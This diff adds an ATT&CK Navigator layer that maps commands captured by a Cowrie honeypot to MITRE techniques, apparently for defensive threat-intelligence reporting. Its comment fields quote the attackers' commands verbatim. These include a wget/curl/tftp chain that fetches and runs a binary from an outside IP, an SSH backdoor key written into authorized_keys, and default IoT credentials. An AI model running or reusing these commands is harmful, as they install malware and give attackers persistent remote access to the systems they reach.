@@ -1,0 +1,87 @@
+{
+  "name": "Greyfield observed techniques",
+  "versions": {
+    "attack": "19.2",
+    "navigator": "5.1",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "ATT&CK techniques mapped conservatively from Greyfield Cowrie observations; counts represent observed evidence, not attributed incidents.",
+  "techniques": [
+    {
+      "techniqueID": "T1059.004",
+      "score": 7421,
+      "comment": "sh; shell",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 3338,
+      "comment": "enable\\x00 / linuxshell\\x00; root / xc3511",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 760,
+      "comment": "rm -f .f; /bin/busybox wget -O .f http://130.12.180.212/x86_64 || wget -O .f http://130.12.180.212/x86_64 || curl -o .f http://130.12.180.212/x86_64 || /bin/busybox tftp -g -l .f -r x86_64 130.12.180.212; /bin/busybox HISILICON; /bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -f .f",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 695,
+      "comment": "http://130.12.180.212/x86_64; rm -f .f; /bin/busybox wget -O .f http://130.12.180.212/x86_64 || wget -O .f http://130.12.180.212/x86_64 || curl -o .f http://130.12.180.212/x86_64 || /bin/busybox tftp -g -l .f -r x86_64 130.12.180.212; /bin/busybox HISILICON",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 538,
+      "comment": "/bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -f .f; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 357,
+      "comment": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe; cat /proc/cpuinfo | grep name | wc -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 231,
+      "comment": "uname -a; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 33,
+      "comment": "top; ps -ef | grep '[Mm]iner'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "score": 32,
+      "comment": "crontab -l; <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.58 (Ubuntu) Server at 103.170.217.170 Port 80</address> </body></html>",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 31,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 4,
+      "comment": "/ip cloud print; ifconfig",
+      "enabled": true
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#17131f",
+      "#7857ff",
+      "#ff5d73"
+    ],
+    "minValue": 0,
+    "maxValue": 7421
+  }
+}
